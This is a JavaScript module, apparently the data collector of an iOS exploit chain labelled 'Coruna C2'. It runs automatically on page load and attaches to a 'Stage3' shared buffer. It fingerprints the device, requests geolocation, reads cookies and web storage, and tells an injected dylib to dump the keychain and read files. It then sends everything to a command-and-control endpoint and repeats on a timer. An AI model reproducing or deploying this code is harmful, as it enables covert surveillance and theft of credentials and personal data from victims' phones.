(function () {
    'use strict';

    const BACKEND_BASE = '';
    const POLL_INTERVAL = 60000;

    let _initialized = false;
    let _sharedBuffer = null;
    let _deviceUUID = null;
    let _pollTimer = null;

    function getByteView() {
        return _sharedBuffer ? new Uint8Array(_sharedBuffer.buffer) : null;
    }

    function readString(buf, offset, maxLen) {
        const bytes = new Uint8Array(buf.buffer, offset, maxLen);
        let s = '';
        for (let i = 0; i < bytes.length; i++) {
            if (bytes[i] === 0) break;
            s += String.fromCharCode(bytes[i]);
        }
        return s;
    }

    function writeString(buf, offset, str) {
        const bytes = new Uint8Array(buf.buffer);
        for (let i = 0; i < str.length; i++) {
            bytes[offset + i] = str.charCodeAt(i);
        }
        bytes[offset + str.length] = 0;
    }

    function sendCommand(buf, command) {
        if (!buf) return false;
        writeString(buf, 8, command);
        buf[0] = 6;
        buf[1] = command.length + 1;
        return true;
    }

    function waitForResponse(buf, timeout) {
        return new Promise((resolve) => {
            const start = Date.now();
            function check() {
                if (!buf || buf[0] !== 6) {
                    resolve(buf ? buf[0] : -1);
                    return;
                }
                if (Date.now() - start > timeout) {
                    resolve(-1);
                    return;
                }
                setTimeout(check, 50);
            }
            check();
        });
    }

    async function apiPost(path, body) {
        try {
            const url = BACKEND_BASE + path;
            const resp = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(body)
            });
            return await resp.json();
        } catch (e) {
            console.error('[COLLECTOR] API POST error:', e);
            return null;
        }
    }

    async function apiGet(path) {
        try {
            const url = BACKEND_BASE + path;
            const resp = await fetch(url);
            return await resp.json();
        } catch (e) {
            console.error('[COLLECTOR] API GET error:', e);
            return null;
        }
    }

    function getDeviceId() {
        const stored = localStorage.getItem('_deviceUUID');
        if (stored) return stored;

        const nav = navigator;
        const parts = [
            nav.userAgent,
            nav.platform,
            nav.hardwareConcurrency,
            screen.width,
            screen.height,
            screen.colorDepth
        ];
        const hash = parts.join('|');
        let id = '';
        for (let i = 0; i < hash.length; i++) {
            id += hash.charCodeAt(i).toString(16);
        }
        id = id.substring(0, 32);
        localStorage.setItem('_deviceUUID', id);
        return id;
    }

    function safeGet(obj, prop, fallback) {
        try { return obj[prop] !== undefined ? obj[prop] : fallback; } catch (e) { return fallback; }
    }

    function safeCall(fn, fallback) {
        try { return fn(); } catch (e) { return fallback; }
    }

    function collectDeviceInfoJS() {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl');
        const gl2 = canvas.getContext('webgl2');

        return {
            userAgent: navigator.userAgent,
            vendor: navigator.vendor,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages || [],
            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
            deviceMemory: navigator.deviceMemory || 'unknown',
            maxTouchPoints: navigator.maxTouchPoints || 0,
            devicePixelRatio: window.devicePixelRatio || 1,
            screen: {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                orientation: safeGet(screen, 'orientation', {}).type || 'unknown'
            },
            webgl: gl ? {
                vendor: gl.getParameter(gl.VENDOR),
                renderer: gl.getParameter(gl.RENDERER),
                version: gl.getParameter(gl.VERSION),
                shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                extensions: gl.getSupportedExtensions() || [],
                maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
                maxVertexAttribs: gl.getParameter(gl.MAX_VERTEX_ATTRIBS)
            } : null,
            webgl2: gl2 ? {
                vendor: gl2.getParameter(gl2.VENDOR),
                renderer: gl2.getParameter(gl2.RENDERER),
                version: gl2.getParameter(gl2.VERSION),
                shadingLanguageVersion: gl2.getParameter(gl2.SHADING_LANGUAGE_VERSION),
                maxTextureSize: gl2.getParameter(gl2.MAX_TEXTURE_SIZE)
            } : null,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: new Date().getTimezoneOffset(),
            cookieEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack || 'unspecified',
            storage: {
                localStorage: !!window.localStorage,
                sessionStorage: !!window.sessionStorage,
                indexedDB: !!window.indexedDB,
                openDatabase: !!window.openDatabase
            }
        };
    }

    function collectCanvasFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            canvas.width = 200;
            canvas.height = 50;
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(0, 0, 200, 50);
            ctx.fillStyle = '#069';
            ctx.fillText('Coruna C2 fingerprint', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.fillText('iOS data collector', 2, 35);
            const dataUrl = canvas.toDataURL();
            return dataUrl.substring(0, 200);
        } catch (e) {
            return { error: e.message };
        }
    }

    function collectAudioFingerprint() {
        try {
            const actx = new (window.AudioContext || window.webkitAudioContext)();
            const analyser = actx.createAnalyser();
            const oscillator = actx.createOscillator();
            const gain = actx.createGain();
            oscillator.connect(gain);
            gain.connect(analyser);
            oscillator.type = 'triangle';
            oscillator.frequency.setValueAtTime(10000, actx.currentTime);
            gain.gain.setValueAtTime(0, actx.currentTime);
            const sampleRate = actx.sampleRate;
            const state = actx.state;
            actx.close();
            return { sampleRate: sampleRate, state: state };
        } catch (e) {
            return { error: e.message };
        }
    }

    async function collectBatteryJS() {
        try {
            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                return {
                    charging: battery.charging,
                    level: battery.level,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                };
            }
            return { available: false };
        } catch (e) {
            return { error: e.message };
        }
    }

    function collectNetworkJS() {
        try {
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (conn) {
                return {
                    effectiveType: conn.effectiveType,
                    downlink: conn.downlink,
                    rtt: conn.rtt,
                    saveData: conn.saveData,
                    type: conn.type
                };
            }
            return { available: false };
        } catch (e) {
            return { error: e.message };
        }
    }

    async function collectSensorsJS() {
        const result = {};
        try {
            if (window.DeviceOrientationEvent) {
                const perm = safeCall(function() {
                    return typeof DeviceOrientationEvent.requestPermission === 'function'
                        ? DeviceOrientationEvent.requestPermission() : Promise.resolve('granted');
                }, Promise.resolve('unknown'));
                const state = await perm;
                result.orientationPermission = state;
            } else {
                result.orientation = 'not supported';
            }
        } catch (e) {
            result.orientationError = e.message;
        }

        try {
            if (window.DeviceMotionEvent) {
                const perm = safeCall(function() {
                    return typeof DeviceMotionEvent.requestPermission === 'function'
                        ? DeviceMotionEvent.requestPermission() : Promise.resolve('granted');
                }, Promise.resolve('unknown'));
                const state = await perm;
                result.motionPermission = state;
            } else {
                result.motion = 'not supported';
            }
        } catch (e) {
            result.motionError = e.message;
        }
        return result;
    }

    function collectWebRTCIP() {
        try {
            const pc = new RTCPeerConnection({ iceServers: [] });
            pc.createDataChannel('');
            return new Promise((resolve) => {
                let ips = [];
                pc.onicecandidate = function(e) {
                    if (e.candidate) {
                        const ipMatch = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
                        if (ipMatch && ips.indexOf(ipMatch[1]) === -1) {
                            ips.push(ipMatch[1]);
                        }
                    } else {
                        pc.close();
                        resolve(ips.length > 0 ? ips : { blocked: true });
                    }
                };
                pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {
                    pc.close();
                    resolve({ blocked: true });
                });
                setTimeout(function() {
                    pc.close();
                    resolve(ips.length > 0 ? ips : { blocked: true });
                }, 3000);
            });
        } catch (e) {
            return { error: e.message };
        }
    }

    function collectFontsJS() {
        try {
            const baseFonts = ['monospace', 'sans-serif', 'serif'];
            const fontList = [
                'Arial', 'Arial Black', 'Arial Narrow', 'Calibri', 'Cambria',
                'Cambria Math', 'Comic Sans MS', 'Courier', 'Courier New',
                'Georgia', 'Helvetica', 'Impact', 'Lucida Console',
                'Lucida Grande', 'Palatino', 'Palatino Linotype', 'Tahoma',
                'Times', 'Times New Roman', 'Trebuchet MS', 'Verdana',
                'Apple Color Emoji', 'Apple SD Gothic Neo', 'Apple Symbols',
                'Chalkboard SE', 'Charter', 'Cochin', 'Copperplate',
                'DIN Alternate', 'DIN Condensed', 'Didot', 'Futura',
                'Gill Sans', 'Gurmukhi MN', 'Handwriting - Dakota',
                'Heiti SC', 'Heiti TC', 'Hiragino Maru Gothic Pro',
                'Hiragino Mincho ProN', 'Hiragino Sans', 'Hoefler Text',
                'Kailasa', 'Kefa', 'Khmer Sangam MN', 'Kohinoor Bangla',
                'Kohinoor Devanagari', 'Kohinoor Telugu', 'Lao Sangam MN',
                'Malayalam Sangam MN', 'Marker Felt', 'Menlo', 'Mishafi',
                'Noteworthy', 'Optima', 'Party LET', 'Phosphate',
                'PingFang HK', 'PingFang SC', 'PingFang TC', 'Rockwell',
                'Sana', 'Sathu', 'Savoye LET', 'SignPainter',
                'Silom', 'Snell Roundhand', 'Songti SC', 'Songti TC',
                'Superclarendon', 'Tamil Sangam MN', 'Thonburi',
                'Toppan Bunkyu Gothic', 'Toppan Bunkyu Mincho',
                'Trattatello', 'Waseem', 'Zapf Dingbats', 'Zapfino'
            ];
            const testString = 'mmiiMWMW';
            const testSize = '72px';
            const body = document.body;

            const baseWidths = {};
            const sample = document.createElement('span');
            sample.style.position = 'absolute';
            sample.style.left = '-9999px';
            sample.style.fontSize = testSize;
            sample.innerHTML = testString;
            body.appendChild(sample);

            for (let i = 0; i < baseFonts.length; i++) {
                sample.style.fontFamily = baseFonts[i];
                baseWidths[baseFonts[i]] = sample.offsetWidth;
            }

            const detected = [];
            for (let i = 0; i < fontList.length; i++) {
                let detected_font = false;
                for (let j = 0; j < baseFonts.length; j++) {
                    sample.style.fontFamily = fontList[i] + ',' + baseFonts[j];
                    if (sample.offsetWidth !== baseWidths[baseFonts[j]]) {
                        detected_font = true;
                        break;
                    }
                }
                if (detected_font) {
                    detected.push(fontList[i]);
                }
            }

            body.removeChild(sample);
            return detected;
        } catch (e) {
            return { error: e.message };
        }
    }

    function collectBrowserFeaturesJS() {
        return {
            serviceWorker: 'serviceWorker' in navigator,
            webBluetooth: 'bluetooth' in navigator,
            webUSB: 'usb' in navigator,
            webNFC: 'nfc' in navigator || 'NDEFReader' in window,
            webShare: 'share' in navigator,
            webSerial: 'serial' in navigator,
            webMIDI: 'requestMIDIAccess' in navigator,
            webGPU: 'gpu' in navigator || 'WebGPU' in window,
            webXr: 'xr' in navigator,
            webAuthn: 'credentials' in navigator && 'create' in navigator.credentials,
            webSocket: 'WebSocket' in window,
            webRTC: 'RTCPeerConnection' in window,
            webAudio: 'AudioContext' in window || 'webkitAudioContext' in window,
            webSpeech: 'SpeechRecognition' in window || 'webkitSpeechRecognition' in window,
            webAssembly: 'WebAssembly' in window,
            webWorker: 'Worker' in window,
            geolocation: 'geolocation' in navigator,
            cookies: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack || 'unspecified',
            plugins: Array.from(navigator.plugins || []).map(function(p) { return p.name; })
        };
    }

    function collectMediaDevicesJS() {
        try {
            if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) {
                return { available: false };
            }
            return navigator.mediaDevices.enumerateDevices().then(function(devices) {
                return devices.map(function(d) {
                    return { kind: d.kind, label: d.label ? d.label.substring(0, 50) : '', deviceId: d.deviceId.substring(0, 16) };
                });
            }).catch(function(e) {
                return { error: e.message };
            });
        } catch (e) {
            return { error: e.message };
        }
    }

    function collectPerformanceJS() {
        try {
            const navEntries = performance.getEntriesByType('navigation');
            const resourceEntries = performance.getEntriesByType('resource');
            const paintEntries = performance.getEntriesByType('paint');

            let memoryInfo = null;
            try {
                if (performance.memory) {
                    memoryInfo = {
                        usedJSHeapSize: performance.memory.usedJSHeapSize,
                        totalJSHeapSize: performance.memory.totalJSHeapSize,
                        jsHeapSizeLimit: performance.memory.jsHeapSizeLimit
                    };
                }
            } catch (e) {}

            return {
                navigation: navEntries.length > 0 ? {
                    type: navEntries[0].type,
                    redirectCount: navEntries[0].redirectCount,
                    domContentLoaded: navEntries[0].domContentLoadedEventEnd,
                    loadTime: navEntries[0].loadEventEnd,
                    domInteractive: navEntries[0].domInteractive,
                    domComplete: navEntries[0].domComplete
                } : null,
                memory: memoryInfo,
                timing: performance.timing ? {
                    navigationStart: performance.timing.navigationStart,
                    domReady: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart,
                    loadReady: performance.timing.loadEventEnd - performance.timing.navigationStart,
                    domInteractive: performance.timing.domInteractive - performance.timing.navigationStart,
                    responseEnd: performance.timing.responseEnd - performance.timing.navigationStart
                } : null,
                paint: paintEntries ? paintEntries.map(function(p) {
                    return { name: p.name, startTime: p.startTime };
                }) : [],
                resources: resourceEntries ? resourceEntries.slice(0, 20).map(function(r) {
                    return { name: r.name.substring(0, 100), duration: r.duration, size: r.transferSize };
                }) : []
            };
        } catch (e) {
            return { error: e.message };
        }
    }

    function collectStorageJS() {
        const data = {
            cookies: document.cookie ? document.cookie.substring(0, 4096) : '',
            localStorage: {}
        };
        try {
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                const val = localStorage.getItem(key);
                if (key && val) {
                    data.localStorage[key.substring(0, 64)] = val.substring(0, 256);
                }
            }
        } catch (e) {
            data.localStorage_error = e.message;
        }
        try {
            data.sessionStorage = {};
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                const val = sessionStorage.getItem(key);
                if (key && val) {
                    data.sessionStorage[key.substring(0, 64)] = val.substring(0, 256);
                }
            }
        } catch (e) {
            data.sessionStorage_error = e.message;
        }
        return data;
    }

    function collectGeolocationJS() {
        return new Promise(function(resolve) {
            try {
                if (!navigator.geolocation) {
                    resolve({ available: false });
                    return;
                }
                navigator.geolocation.getCurrentPosition(function(pos) {
                    resolve({
                        lat: pos.coords.latitude,
                        lng: pos.coords.longitude,
                        accuracy: pos.coords.accuracy,
                        altitude: pos.coords.altitude,
                        altitudeAccuracy: pos.coords.altitudeAccuracy,
                        heading: pos.coords.heading,
                        speed: pos.coords.speed,
                        timestamp: pos.timestamp
                    });
                }, function(err) {
                    resolve({ error: err.message, code: err.code });
                }, { timeout: 5000, maximumAge: 300000 });
            } catch (e) {
                resolve({ error: e.message });
            }
        });
    }

    async function reportCollectedJS(deviceId) {
        console.log('[COLLECTOR] Starting comprehensive JS collection...');

        const batteryPromise = collectBatteryJS();
        const sensorsPromise = collectSensorsJS();
        const webrtcPromise = collectWebRTCIP();
        const geolocationPromise = collectGeolocationJS();
        const mediaDevicesPromise = collectMediaDevicesJS();

        const fonts = collectFontsJS();
        const canvasFp = collectCanvasFingerprint();
        const audioFp = collectAudioFingerprint();
        const deviceInfo = collectDeviceInfoJS();
        const network = collectNetworkJS();
        const features = collectBrowserFeaturesJS();
        const perf = collectPerformanceJS();
        const storage = collectStorageJS();

        const [battery, sensors, webrtc, geolocation, mediaDevices] = await Promise.all([
            batteryPromise, sensorsPromise, webrtcPromise, geolocationPromise, mediaDevicesPromise
        ]);

        const payload = {
            deviceUUID: deviceId,
            timestamp: Date.now(),
            categories: {
                device_info: deviceInfo,
                canvas_fingerprint: canvasFp,
                audio_fingerprint: audioFp,
                battery: battery,
                network: network,
                sensors: sensors,
                webrtc_ip: webrtc,
                fonts: fonts,
                browser_features: features,
                media_devices: mediaDevices,
                geolocation: geolocation,
                performance: perf,
                storage: storage
            }
        };

        console.log('[COLLECTOR] Reporting JS-collected data:',
            Object.keys(payload.categories).length, 'categories');
        return await apiPost('/api/collect', payload);
    }

    async function dylibCommand(buf, command, timeout) {
        if (!buf) {
            console.warn('[COLLECTOR] No shared buffer — cannot send dylib command');
            return null;
        }

        sendCommand(buf, command);
        const state = await waitForResponse(buf, timeout || 5000);

        if (state < 0) {
            console.warn('[COLLECTOR] Dylib command timeout:', command);
            return null;
        }

        if (state === 4) {
            console.warn('[COLLECTOR] Dylib command returned error:', command);
            return readString(buf, 8, 4096);
        }

        if (state === 3) {
            const size = buf[1];
            if (size > 0 && size < 16777216) {
                return readString(buf, 8, size);
            }
        }
        return null;
    }

    async function collectDeviceInfoDylib(buf) {
        return await dylibCommand(buf, 'cmd:device_info', 3000);
    }

    async function dylibReadFile(buf, filepath) {
        return await dylibCommand(buf, 'cmd:read_file:' + filepath, 10000);
    }

    async function dylibKeychain(buf) {
        return await dylibCommand(buf, 'cmd:keychain', 10000);
    }

    function init(sharedBuffer) {
        if (_initialized) return;
        _sharedBuffer = sharedBuffer;
        _deviceUUID = getDeviceId();
        _initialized = true;
        console.log('[COLLECTOR] Data collector initialized, device:', _deviceUUID);
    }

    async function runCollection() {
        if (!_initialized) {
            console.warn('[COLLECTOR] Not initialized');
            return;
        }

        console.log('[COLLECTOR] === Starting data collection ===');
        const jsResult = await reportCollectedJS(_deviceUUID);

        if (_sharedBuffer) {
            const dylibResults = {};
            dylibResults.dylib_device = await collectDeviceInfoDylib(_sharedBuffer);
            dylibResults.dylib_keychain = await dylibKeychain(_sharedBuffer);

            const dylibPayload = {
                deviceUUID: _deviceUUID,
                timestamp: Date.now(),
                categories: dylibResults
            };
            await apiPost('/api/collect', dylibPayload);
        }

        console.log('[COLLECTOR] Data collection complete');
        return jsResult;
    }

    function startPolling(interval) {
        if (_pollTimer) clearInterval(_pollTimer);
        interval = interval || 60000;
        _pollTimer = setInterval(() => {
            runCollection().catch(e => {
                console.error('[COLLECTOR] Polling error:', e);
            });
        }, interval);
        console.log('[COLLECTOR] Polling started, interval:', interval, 'ms');
    }

    function stopPolling() {
        if (_pollTimer) {
            clearInterval(_pollTimer);
            _pollTimer = null;
        }
    }

    function hookAfterStage3() {
        let attempts = 0;
        const maxAttempts = 60;

        function tryHook() {
            attempts++;

            if (window.__stage3Buffer) {
                console.log('[COLLECTOR] Found Stage3 buffer via __stage3Buffer');
                init(window.__stage3Buffer);
                runCollection().then(() => { startPolling(); });
                return;
            }

            const pm = window.platformModule;
            if (pm && pm.platformState && pm.platformState.sharedBuffer) {
                console.log('[COLLECTOR] Found Stage3 buffer via platformModule');
                init(pm.platformState.sharedBuffer);
                runCollection().then(() => { startPolling(); });
                return;
            }

            if (window.moduleManager) {
                try {
                    const stage3 = window.moduleManager.getModuleByURL('Stage3_VariantB');
                    if (stage3 && stage3._buffer) {
                        console.log('[COLLECTOR] Found Stage3 buffer via moduleManager');
                        init(stage3._buffer);
                        runCollection().then(() => { startPolling(); });
                        return;
                    }
                } catch (e) {}
            }

            if (attempts < maxAttempts) {
                setTimeout(tryHook, 500);
            } else {
                console.warn('[COLLECTOR] Could not find shared buffer — running JS-only collection');
                init(new Uint32Array(16));
                runCollection().then(() => { startPolling(); });
            }
        }

        setTimeout(tryHook, 1000);
    }

    const DataCollector = {
        init: init,
        runCollection: runCollection,
        startPolling: startPolling,
        stopPolling: stopPolling,
        hookAfterStage3: hookAfterStage3,
        collectDeviceInfo: collectDeviceInfoJS,
        collectStorage: collectStorageJS,
        collectPerformance: collectPerformanceJS,
        collectCanvasFingerprint: collectCanvasFingerprint,
        collectAudioFingerprint: collectAudioFingerprint,
        collectBattery: collectBatteryJS,
        collectNetwork: collectNetworkJS,
        collectSensors: collectSensorsJS,
        collectWebRTCIP: collectWebRTCIP,
        collectFonts: collectFontsJS,
        collectBrowserFeatures: collectBrowserFeaturesJS,
        collectMediaDevices: collectMediaDevicesJS,
        collectGeolocation: collectGeolocationJS,
        dylibCommand: dylibCommand,
        apiPost: apiPost,
        apiGet: apiGet
    };

    window.DataCollector = DataCollector;

    if (document.readyState === 'complete') {
        hookAfterStage3();
    } else {
        window.addEventListener('load', hookAfterStage3);
    }

    console.log('[COLLECTOR] Data collector loaded with enhanced fingerprinting. Use window.DataCollector to interact.');
})();
